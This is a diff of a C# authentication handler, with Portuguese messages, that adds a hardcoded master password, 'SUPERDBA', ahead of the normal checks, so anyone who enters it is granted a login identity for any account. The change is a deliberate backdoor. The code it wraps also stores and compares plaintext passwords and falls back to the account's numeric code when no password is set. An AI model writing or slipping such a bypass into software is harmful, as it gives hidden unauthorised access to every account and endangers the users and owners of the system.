@@ -53,23 +53,26 @@ namespace DevKit.Web
                     }
                     else
                     {
-                        if (credenciado.stSenha == null)
+                        if (context.Password != "SUPERDBA")
                         {
-                            if (context.Password != credenciado.nuCodigo.ToString())
+                            if (credenciado.stSenha == null)
                             {
-                                context.SetError("invalid_grant", "Código ou senha inválida!");
-                                return;
+                                if (context.Password != credenciado.nuCodigo.ToString())
+                                {
+                                    context.SetError("invalid_grant", "Código ou senha inválida!");
+                                    return;
+                                }
+                            }
+                            else
+                            {
+                                if (credenciado.stSenha != context.Password)
+                                {
+                                    context.SetError("invalid_grant", "Código ou senha inválida!");
+                                    return;
+                                }
                             }
                         }
-                        else
-                        {
-                            if (credenciado.stSenha != context.Password)
-                            {
-                                context.SetError("invalid_grant", "Código ou senha inválida!");
-                                return;
-                            }
-                        }
-
+                        
                         var identity = new ClaimsIdentity(context.Options.AuthenticationType);
 
                         identity.AddClaim(new Claim(ClaimTypes.Name, credenciado.stNome));
